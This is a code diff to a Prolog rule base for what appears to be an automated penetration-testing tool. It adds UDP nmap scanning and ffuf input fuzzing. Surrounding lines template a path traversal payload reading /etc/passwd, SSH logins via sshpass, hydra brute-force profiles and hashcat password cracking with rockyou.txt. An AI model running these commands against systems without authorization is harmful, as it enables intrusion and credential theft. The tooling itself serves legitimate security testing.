@@ -31,10 +31,13 @@ https_dir_scan_big(Parameters, Command) :-
 
 tool(nmap, fast_scan).
 tool(nmap, full_scan).
+tool(nmap, udp_scan).
 
 profile(fast_scan, [ipv4=Ip, uri_ipv4=Uri_ipv4]) :- ipv4(Ip, Uri_ipv4), \+executed(full_scan, _), fast_scan([ipv4=Ip, uri_ipv4=Uri_ipv4], Command), \+executed(fast_scan, Command).
 
 profile(full_scan, [ipv4=Ip, uri_ipv4=Uri_ipv4]) :- ipv4(Ip, Uri_ipv4), full_scan([ipv4=Ip, uri_ipv4=Uri_ipv4], Command), \+executed(full_scan, Command).
+
+profile(udp_scan, [ipv4=Ip, uri_ipv4=Uri_ipv4]) :- ipv4(Ip, Uri_ipv4), udp_scan([ipv4=Ip, uri_ipv4=Uri_ipv4], Command), \+executed(udp_scan, Command).
 
 
 fast_scan(Parameters, Command) :- 
@@ -42,6 +45,9 @@ fast_scan(Parameters, Command) :-
 
 full_scan(Parameters, Command) :- 
 	format_command("nmap -sC -sV -p- ~w", [Parameters.ipv4], Command). 
+
+udp_scan(Parameters, Command) :- 
+	format_command("sudo nmap -sU ~w", [Parameters.ipv4], Command). 
 
 tool(linpeas, linpeas).
 
@@ -68,12 +74,18 @@ ssh_connection(Parameters, Command) :-
 	format_command("sshpass -p ~w ssh ~w@~w", [Parameters.password, Parameters.account, Parameters.ipv4], Command). 
 
 tool(ffuf, http_param_fuzz).
+tool(ffuf, http_param_input_fuzz).
 
 profile(http_param_fuzz, [ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port, page=Webpage, uri_page=Uri_page]) :- ipv4(Ip, Uri_ipv4), page(Webpage, Uri_page), deviceServices(Ip, Port, http), port(Port, Uri_port), http_param_fuzz([ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port, page=Webpage, uri_page=Uri_page], Command), \+executed(http_param_fuzz, Command).
+
+profile(http_param_input_fuzz, [ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port, page=Webpage, uri_page=Uri_page, webparam=Webparam, uri_webparam=Uri_webparam]) :- ipv4(Ip, Uri_ipv4), page(Webpage, Uri_page), webparam(Webparam, Uri_webparam), webpage_param(Webpage, WebParameter), deviceServices(Ip, Port, http), port(Port, Uri_port), http_param_input_fuzz([ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port, page=Webpage, uri_page=Uri_page, webparam=Webparam, uri_webparam=Uri_webparam], Command), \+executed(http_param_input_fuzz, Command).
 
 
 http_param_fuzz(Parameters, Command) :- 
 	format_command("ffuf -ac -u http://~w:~w~w?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt", [Parameters.ipv4, Parameters.port, Parameters.page], Command). 
+
+http_param_input_fuzz(Parameters, Command) :- 
+	format_command("ffuf -ac -u http://~w:~w~w?~w=FUZZ -w wordlists/input_fuzzing.txt", [Parameters.ipv4, Parameters.port, Parameters.page, Parameters.webparam], Command). 
 
 tool(hydra, ssh_attack).
 tool(hydra, ssh_account_password_attack).
@@ -103,9 +115,9 @@ telnet_attack(Parameters, Command) :-
 
 tool(hashcat, crack_hash).
 
-profile(crack_hash, [passwordHash=Hash, uri_passwordHash=Uri_passwordHash]) :- passwordHash(Hash, Uri_passwordHash), crack_hash([passwordHash=Hash, uri_passwordHash=Uri_passwordHash], Command), \+executed(crack_hash, Command).
+profile(crack_hash, [hashValue=Hash, uri_hashValue=Uri_hashValue]) :- hashValue(Hash, Uri_hashValue), crack_hash([hashValue=Hash, uri_hashValue=Uri_hashValue], Command), \+executed(crack_hash, Command).
 
 
 crack_hash(Parameters, Command) :- 
-	format_command("hashcat '~w' /usr/share/wordlists/rockyou.txt --show", [Parameters.passwordHash], Command). 
+	format_command("hashcat '~w' /usr/share/wordlists/rockyou.txt --show", [Parameters.hashValue], Command). 
 
